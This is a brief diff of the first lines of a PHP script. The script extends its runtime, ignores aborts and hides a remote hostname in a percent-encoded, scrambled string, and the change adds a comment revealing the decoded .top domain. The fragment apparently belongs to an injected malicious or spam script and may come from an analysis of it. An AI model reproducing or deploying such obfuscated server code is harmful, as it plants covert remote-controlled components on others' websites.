@@ -1,7 +1,7 @@
 <?php
 @set_time_limit(3600);
 @ignore_user_abort(1);
-$xmlname = '%78%6E%70%62%67%67%6E%74%72%6B%78%2E%78%72%61%65%72%76%2E%67%62%63';
+$xmlname = '%78%6E%70%62%67%67%6E%74%72%6B%78%2E%78%72%61%65%72%76%2E%67%62%63'; // http://kacottagexk.kenrei.top/
 
 
 
